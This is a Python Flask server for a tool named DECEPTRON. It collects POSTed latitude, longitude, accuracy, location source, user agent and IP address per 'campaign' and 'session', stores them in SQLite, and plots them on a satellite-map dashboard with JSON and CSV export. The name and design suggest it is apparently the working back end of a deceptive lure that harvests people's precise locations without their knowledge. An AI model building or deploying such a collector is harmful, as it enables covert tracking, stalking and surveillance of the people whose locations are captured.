#!/usr/bin/env python3
"""
DECEPTRON — Collector & Dashboard Server (fixed)
Fixes: DB auto-init, safe JSON parsing, server-side timestamp fallback,
XSS-safe dashboard popups, Null-Island filtering, banner module.
"""

import os, json, sqlite3, uuid
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS

from init_db import init_db
from banner import print_banner

app = Flask(__name__)
CORS(app)

CONFIG_PATH = "config.json"
config = {}
if os.path.exists(CONFIG_PATH):
    with open(CONFIG_PATH) as f:
        config = json.load(f)

DB_PATH = config.get("db_path", "db/hits.db")
MAP_TILE = config.get(
    "map_tile_url",
    "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}",
)
init_db(DB_PATH)


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


@app.route("/")
def dashboard():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) AS total FROM hits")
    total = c.fetchone()["total"]
    c.execute("SELECT COUNT(DISTINCT session_id) AS sessions FROM hits")
    sessions = c.fetchone()["sessions"]
    c.execute("SELECT MAX(timestamp) AS last FROM hits")
    last = c.fetchone()["last"]
    conn.close()

    last_str = datetime.fromtimestamp(last).strftime("%Y-%m-%d %H:%M:%S") if last else "Never"

    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>DECEPTRON | Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background:#0a0a0f; color:#e0e0e0; font-family:'Segoe UI',system-ui,sans-serif; overflow:hidden; }}
        #map {{ position:absolute; top:56px; left:0; right:0; bottom:0; }}
        #header {{
            position:absolute; top:0; left:0; right:0; height:56px; z-index:1000;
            background:#111118; border-bottom:1px solid #23232e;
            display:flex; align-items:center; gap:16px; padding:0 16px;
        }}
        #header h1 {{ font-size:18px; color:#00ff88; letter-spacing:2px; }}
        #header select, #header button {{
            background:#1b1b24; color:#e0e0e0; border:1px solid #33334a;
            border-radius:4px; padding:6px 10px; font-size:13px; cursor:pointer;
        }}
        #header button:hover {{ border-color:#00ff88; }}
        #stats {{ margin-left:auto; font-size:12px; color:#888; }}
        #stats span {{ color:#00ff88; font-weight:bold; }}
        .leaflet-popup-content {{ font-size:12px; }}
    </style>
</head>
<body>
    <div id="header">
        <h1>DECEPTRON</h1>
        <select id="campaignFilter" onchange="filterCampaign()">
            <option value="all">All Campaigns</option>
        </select>
        <button onclick="exportData('json')">Export JSON</button>
        <button onclick="exportData('csv')">Export CSV</button>
        <div id="stats">
            Hits: <span id="statHits">{total}</span> |
            Sessions: <span id="statSessions">{sessions}</span> |
            Last: <span id="statLast">{last_str}</span>
        </div>
    </div>
    <div id="map"></div>

    <script>
        const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({{
            '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
        }})[c]);

        const map = L.map('map').setView([20, 0], 2);
        L.tileLayer('{MAP_TILE}', {{ attribution: 'ESRI Satellite', maxZoom: 18 }}).addTo(map);

        let markers = [];
        let allData = [];

        function getColor(source) {{
            if (source === 'gps') return '#00ff88';
            if (source === 'wifi') return '#ffcc00';
            return '#ff3366';
        }}

        function renderMarkers(data) {{
            markers.forEach(m => map.removeLayer(m));
            markers = [];
            const valid = data.filter(h => !(Number(h.lat) === 0 && Number(h.lng) === 0));
            valid.forEach(hit => {{
                const circle = L.circleMarker([hit.lat, hit.lng], {{
                    radius: 8,
                    fillColor: getColor(hit.source),
                    color: '#fff', weight: 2, opacity: 1, fillOpacity: 0.8
                }}).addTo(map);
                const time = new Date(hit.ts * 1000).toLocaleString();
                circle.bindPopup(
                    '<b>Campaign:</b> ' + esc(hit.campaign_id) + '<br>' +
                    '<b>Session:</b> ' + esc(hit.session_id) + '<br>' +
                    '<b>Lat:</b> ' + Number(hit.lat).toFixed(5) + '<br>' +
                    '<b>Lng:</b> ' + Number(hit.lng).toFixed(5) + '<br>' +
                    '<b>Accuracy:</b> ' + esc(hit.acc) + 'm<br>' +
                    '<b>Source:</b> ' + esc(hit.source) + '<br>' +
                    '<b>UA:</b> ' + esc(String(hit.ua || '').substring(0, 60)) + '<br>' +
                    '<b>Time:</b> ' + time
                );
                markers.push(circle);
            }});
        }}

        async function loadData() {{
            const resp = await fetch('/data');
            allData = await resp.json();
            const campaigns = [...new Set(allData.map(d => d.campaign_id))];
            const sel = document.getElementById('campaignFilter');
            const current = sel.value;
            sel.innerHTML = '<option value="all">All Campaigns</option>';
            campaigns.forEach(c => {{
                const opt = document.createElement('option');
                opt.value = c; opt.textContent = c;
                sel.appendChild(opt);
            }});
            if (campaigns.includes(current)) sel.value = current;
            filterCampaign();
            updateStats();
        }}

        function filterCampaign() {{
            const c = document.getElementById('campaignFilter').value;
            renderMarkers(c === 'all' ? allData : allData.filter(d => d.campaign_id === c));
        }}

        function updateStats() {{
            document.getElementById('statHits').textContent = allData.length;
            document.getElementById('statSessions').textContent =
                [...new Set(allData.map(d => d.session_id))].length;
        }}

        function exportData(fmt) {{ window.location.href = '/export/' + fmt; }}

        setInterval(loadData, 10000);
        loadData();
    </script>
</body>
</html>
    """
    return render_template_string(html)


@app.route("/log", methods=["POST"])
def collector():
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        return jsonify({"status": "bad json"}), 400

    try:
        lat = float(data.get("lat") or 0)
        lng = float(data.get("lng") or 0)
        acc = float(data.get("acc") or 99999)
    except (TypeError, ValueError):
        return jsonify({"status": "bad coords"}), 400

    campaign_id = str(data.get("id", "unknown"))[:64]
    session_id = str(data.get("session") or uuid.uuid4().hex[:8])[:32]
    ua = str(data.get("ua", ""))[:512]
    source = str(data.get("source", "unknown"))[:16]
    try:
        ts = int(data.get("ts")) if data.get("ts") else int(datetime.now().timestamp())
    except (TypeError, ValueError):
        ts = int(datetime.now().timestamp())
    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "unknown"

    conn = get_db()
    c = conn.cursor()
    c.execute(
        """INSERT INTO hits (campaign_id, session_id, latitude, longitude,
           accuracy, user_agent, ip, timestamp, source) VALUES (?,?,?,?,?,?,?,?,?)""",
        (campaign_id, session_id, lat, lng, acc, ua, ip, ts, source),
    )
    c.execute("SELECT id FROM sessions WHERE id=?", (session_id,))
    now = int(datetime.now().timestamp())
    if c.fetchone():
        c.execute("UPDATE sessions SET last_seen=?, hit_count=hit_count+1 WHERE id=?",
                  (now, session_id))
    else:
        c.execute("INSERT INTO sessions (id, campaign_id, first_seen, last_seen, hit_count) "
                  "VALUES (?,?,?,?,1)", (session_id, campaign_id, now, now))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})


HIT_COLS = ("campaign_id, session_id, latitude AS lat, longitude AS lng, "
            "accuracy AS acc, user_agent AS ua, timestamp AS ts, source")


@app.route("/data")
def data_all():
    conn = get_db()
    rows = [dict(r) for r in conn.execute(
        f"SELECT {HIT_COLS} FROM hits ORDER BY timestamp DESC")]
    conn.close()
    return jsonify(rows)


@app.route("/data/<campaign>")
def data_campaign(campaign):
    conn = get_db()
    rows = [dict(r) for r in conn.execute(
        f"SELECT {HIT_COLS} FROM hits WHERE campaign_id=? ORDER BY timestamp DESC",
        (campaign,))]
    conn.close()
    return jsonify(rows)


@app.route("/export/json")
def export_json():
    conn = get_db()
    rows = [dict(r) for r in conn.execute("SELECT * FROM hits")]
    conn.close()
    return jsonify(rows)


@app.route("/export/csv")
def export_csv():
    import csv, io
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM hits")
    rows = c.fetchall()
    cols = [d[0] for d in c.description]
    conn.close()

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(cols)
    writer.writerows(rows)
    return send_file(io.BytesIO(output.getvalue().encode()), mimetype="text/csv",
                     as_attachment=True, download_name="deceptron_export.csv")


if __name__ == "__main__":
    host = config.get("server_host", "0.0.0.0")
    port = config.get("server_port", 5000)
    print_banner()
    app.run(host=host, port=port, debug=False)